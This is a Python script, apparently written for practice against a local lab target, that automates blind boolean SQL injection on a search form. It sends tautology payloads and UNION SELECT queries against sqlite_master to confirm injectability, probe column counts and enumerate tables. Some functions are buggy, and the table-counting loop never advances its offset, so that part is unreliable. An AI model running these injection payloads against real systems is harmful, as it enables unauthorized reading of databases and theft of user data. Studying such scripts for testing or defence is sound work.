import requests
import re, sys

url = "http://localhost/search"
field = "search_term"

def ping(url, data):
    try:
        resp = requests.post(url, data)
        rText = resp.text

        pattern_user_doesnt_exist = re.compile(r"</form><br><p>User Doesn&#39;t exits.</p><br><br>", re.IGNORECASE)
        pattern_user_exists = re.compile(r"</form><br><p>User exits!</p><br><br>", re.IGNORECASE)


        if resp.status_code == 200:
            if pattern_user_doesnt_exist.search(rText):
                return False
            elif pattern_user_exists.search(rText):
                return True
            else:
                print("Error no Matches found", rText)
                sys.exit()
        else:
            print(f"Error: {resp.status_code}")

    except requests.RequestException as e:
        print(f"Error: {e}")

def basicTest():
    truthy = {field: "'or 1==1--"}
    falsy = {field:"'or 1==2--"}
    if not ping(url, truthy) or ping(url, falsy):
        print("basicTest failed.... exiting!")
        sys.exit()

def colCount():
    run = True
    count=0
    string = "' UNION SELECT null,null,null,null,null"
    print("colExitst: ",ping(url, {field: string}))

def hasTable():
    tablestring = "' UNION SELECT null, table_name FROM sqlite_master WHERE '1'='1' --"
    if not ping(url, {field: tablestring}):
        print("Table doesnt exist.... exiting")
        sys.exit()

def noOfTables():
    run = True
    count=0
    string = "' UNION SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET"+str(count)+" --"

    while run:
        if ping(url, {field: string}):
            count=count+1
        else:
            run= False
    print(f"no of tables = {count}")


basicTest()
hasTable()
#noOfTables()
#print(ping(url, {field: "' UNION SELECT null, name, null FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 1--"}))
colCount()